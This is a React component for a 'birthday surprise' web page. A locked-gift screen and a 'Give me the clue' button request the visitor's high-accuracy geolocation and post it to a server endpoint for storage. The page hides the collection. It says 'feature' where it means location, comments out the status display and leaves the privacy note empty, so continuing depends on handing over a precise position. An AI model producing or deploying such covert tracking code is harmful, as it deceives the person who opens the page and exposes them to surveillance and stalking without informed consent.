"use client";

import React, { useState } from "react";
import {
  KeyRound,
  Sparkles,
  MapPin,
  Loader2,
  ShieldCheck,
  AlertCircle,
} from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";

import {
  Screen,
  FlowButton,
  LockedGift,
  FloatingHearts,
} from "../components";
import "./screen6.css";

export default function Screen6({ next }) {
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState("");
  const [statusType, setStatusType] = useState("");

  const shareLocationAndContinue = () => {
    // Already processing
    if (loading) return;

    // Browser doesn't support geolocation
    if (!navigator.geolocation) {
      setStatus(
        "feature isn't supported by this browser."
      );
      setStatusType("error");
      return;
    }

    setLoading(true);
    setStatus("Asking for your permission…");
    setStatusType("loading");

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const payload = {
          label: "Birthday surprise location",
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy_m: position.coords.accuracy,
        };

        try {
          setStatus("Showing...");
          setStatusType("loading");

          const response = await fetch("/api/location", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(payload),
          });

          let data = {};

          try {
            data = await response.json();
          } catch {
            // Ignore invalid JSON response
          }

          if (!response.ok) {
            throw new Error(
              data?.error || "Could not save your information."
            );
          }

          // Location has successfully reached the database.
          setStatus("successfully. 💗");
          setStatusType("success");

          /*
           * Small delay so the user can see the success message
           * before moving to Screen 7.
           */
          setTimeout(() => {
            next();
          }, 650);
        } catch (error) {
          console.error("feature save error:", error);

          setStatus(
            error?.message ||
              "Something went wrong while saving your feature."
          );
          setStatusType("error");

          // IMPORTANT:
          // We do NOT call next() here.
        } finally {
          setLoading(false);
        }
      },

      (error) => {
        console.error("Geolocation error:", error);

        setLoading(false);

        switch (error.code) {
          case error.PERMISSION_DENIED:
            setStatus(
              "Feature permission is required to continue. Please allow Feature access and try again."
            );
            break;

          case error.POSITION_UNAVAILABLE:
            setStatus(
              "We couldn't determine your Feature. Please try again."
            );
            break;

          case error.TIMEOUT:
            setStatus(
              "The Feature request took too long. Please try again."
            );
            break;

          default:
            setStatus(
              "We couldn't get your Feature. Please try again."
            );
        }

        setStatusType("error");
      },

      {
        enableHighAccuracy: true,
        timeout: 20000,
        maximumAge: 0,
      }
    );
  };

  return (
    <Screen step={6} dark>
      <main className="bs-stage bs-dark-stage bs-screen6">

        <FloatingHearts dark />

        {/* Ambient glow */}
        <motion.div
          className="bs-screen6-glow"
          animate={{
            scale: [1, 1.12, 1],
            opacity: [0.18, 0.32, 0.18],
          }}
          transition={{
            duration: 5,
            repeat: Infinity,
            ease: "easeInOut",
          }}
        />

        <div className="bs-content bs-screen6-content">

          {/* Label */}
          <motion.div
            className="bs-eyebrow-pill dark-pill"
            initial={{ opacity: 0, y: -10 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
          >
            <Sparkles size={11} />
            <span>A SECRET GIFT</span>
            <Sparkles size={11} />
          </motion.div>

          {/* Locked gift */}
          <motion.div
            initial={{ opacity: 0, scale: 0.85 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{
              delay: 0.12,
              type: "spring",
              stiffness: 130,
              damping: 14,
            }}
          >
            <LockedGift />
          </motion.div>

          {/* Heading */}
          <motion.div
            className="bs-screen6-heading"
            initial={{ opacity: 0, y: 15 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.25 }}
          >
            <h2 className="bs-heading dark-heading">
              One gift is still
              <br />
              <em>locked… 🔐</em>
            </h2>
          </motion.div>

          {/* Explanation */}
          <motion.p
            className="bs-subtitle dark-subtitle bs-screen6-description"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.38 }}
          >
            This one isn't opened with a click.
            <br />
            It needs a little piece of{" "}
            <strong>our story.</strong> 🕵️‍♀️
          </motion.p>

          {/* Location information */}
          <motion.div
            className="bs-location-info"
            initial={{ opacity: 0, y: 8 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.5 }}
          >
          

            <div>
              <strong>A tiny clue is needed</strong>
             
            </div>
          </motion.div>

          {/* Status */}
          {/* <AnimatePresence mode="wait">
            {status && (
              <motion.div
                key={status}
                className={`bs-location-status ${statusType}`}
                initial={{
                  opacity: 0,
                  y: 8,
                  scale: 0.97,
                }}
                animate={{
                  opacity: 1,
                  y: 0,
                  scale: 1,
                }}
                exit={{
                  opacity: 0,
                  y: -5,
                }}
              >
                {statusType === "loading" && (
                  <Loader2
                    size={14}
                    className="bs-spin"
                  />
                )}

                {statusType === "success" && (
                  <ShieldCheck size={14} />
                )}

                {statusType === "error" && (
                  <AlertCircle size={14} />
                )}

                <span>{status}</span>
              </motion.div>
            )}
          </AnimatePresence> */}

          {/* Continue button */}
          <motion.div
            className="bs-screen6-button"
            initial={{ opacity: 0, y: 15 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.62 }}
          >
            <FlowButton
              onClick={shareLocationAndContinue}
              icon={loading ? Loader2 : KeyRound}
              disabled={loading}
            >
              {loading
                ? "Getting your feature..."
                : "Give me the clue"}
            </FlowButton>
          </motion.div>

          {/* Privacy note */}
          <motion.div
            className="bs-location-note"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.8 }}
          >
           
          </motion.div>

        </div>
      </main>
    </Screen>
  );
}